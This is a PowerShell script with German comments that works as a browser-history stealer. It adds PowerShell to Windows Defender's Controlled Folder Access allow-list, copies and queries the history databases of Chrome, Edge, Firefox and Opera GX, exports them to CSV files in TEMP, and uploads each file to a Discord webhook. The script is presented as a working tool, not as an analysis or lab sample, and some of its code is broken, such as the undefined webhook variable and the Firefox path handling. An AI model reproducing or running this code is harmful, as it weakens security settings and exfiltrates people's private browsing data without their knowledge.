# Funktion zum Hinzufügen der PowerShell-Executable zur Liste der zugelassenen Anwendungen im kontrollierten Ordnerzugriff
function Add-PowerShellToAllowedApps {
    Add-MpPreference -ControlledFolderAccessAllowedApplications "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
}

# Fügen Sie PowerShell zur Liste der zugelassenen Anwendungen hinzu
Add-PowerShellToAllowedApps

# Funktion zum Exportieren des Verlaufs von Chrome und Edge
function Export-ChromeEdgeHistory {
    param (
        [string]$browser,
        [string]$historyPath,
        [string]$outputFile
    )
    
    $query = @"
SELECT 
    url, 
    title, 
    datetime(last_visit_time/1000000-11644473600, 'unixepoch') as last_visit_time 
FROM 
    urls 
ORDER BY 
    last_visit_time DESC
"@

    $tempDb = "$env:TEMP\${browser}_History"
    Copy-Item $historyPath $tempDb -Force

    # Load SQLite assembly
    Add-Type -TypeDefinition @"
using System;
using System.Data.SQLite;
public class SQLiteHelper {
    public static string GetConnectionString(string dbPath) {
        return $"Data Source={dbPath};Version=3;";
    }
}
"@
    $connectionString = [SQLiteHelper]::GetConnectionString($tempDb)

    $connection = New-Object System.Data.SQLite.SQLiteConnection
    $connection.ConnectionString = $connectionString
    $connection.Open()

    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()

    $history = @()
    while ($reader.Read()) {
        $history += [PSCustomObject]@{
            URL = $reader["url"]
            Title = $reader["title"]
            LastVisitTime = $reader["last_visit_time"]
        }
    }

    $reader.Close()
    $connection.Close()
    Remove-Item $tempDb -Force

    $history | Export-Csv -Path $outputFile -NoTypeInformation
}

# Funktion zum Exportieren des Verlaufs von Firefox
function Export-FirefoxHistory {
    param (
        [string]$historyPath,
        [string]$outputFile
    )

    $query = @"
SELECT 
    moz_places.url, 
    moz_places.title, 
    datetime(moz_historyvisits.visit_date/1000000, 'unixepoch') as visit_date 
FROM 
    moz_places, 
    moz_historyvisits 
WHERE 
    moz_places.id = moz_historyvisits.place_id 
ORDER BY 
    visit_date DESC
"@

    # Load SQLite assembly
    Add-Type -TypeDefinition @"
using System;
using System.Data.SQLite;
public class SQLiteHelper {
    public static string GetConnectionString(string dbPath) {
        return $"Data Source={dbPath};Version=3;";
    }
}
"@
    $connectionString = [SQLiteHelper]::GetConnectionString($historyPath)

    $connection = New-Object System.Data.SQLite.SQLiteConnection
    $connection.ConnectionString = $connectionString
    $connection.Open()

    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()

    $history = @()
    while ($reader.Read()) {
        $history += [PSCustomObject]@{
            URL = $reader["url"]
            Title = $reader["title"]
            VisitDate = $reader["visit_date"]
        }
    }

    $reader.Close()
    $connection.Close()

    $history | Export-Csv -Path $outputFile -NoTypeInformation
}

# Funktion zum Senden einer Datei an den Discord Webhook
function Send-FileToWebhook {
    param (
        [string]$filePath,
        [string]$whuri
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)

    $form = @{
        file1 = [System.IO.File]::ReadAllBytes($filePath)
    }

    Invoke-RestMethod -Uri $whuri -Method Post -Form $form
}

# Set the output directory to the TEMP folder
$outputDir = "$env:TEMP"

# Define paths for data storage
$paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
}

# Define browsers and data
$browsers = @('chrome', 'edge', 'firefox', 'opera')

foreach ($browser in $browsers) {
    $historyPath = $paths["${browser}_history"]
    $outputFile = "$outputDir\${browser}-history.csv"
    
    if ($browser -eq 'firefox') {
        $profiles = Get-ChildItem -Path $historyPath -Directory
        foreach ($profile in $profiles) {
            Export-FirefoxHistory -historyPath $profile.FullName -outputFile $outputFile
            Send-FileToWebhook -filePath $outputFile -whuri $whuri
        }
    } else {
        if (Test-Path $historyPath) {
            Export-ChromeEdgeHistory -browser $browser -historyPath $historyPath -outputFile $outputFile
            Send-FileToWebhook -filePath $outputFile -whuri $whuri
        }
    }
}

Write-Host "History export completed. Files sent to webhook: $whuri"
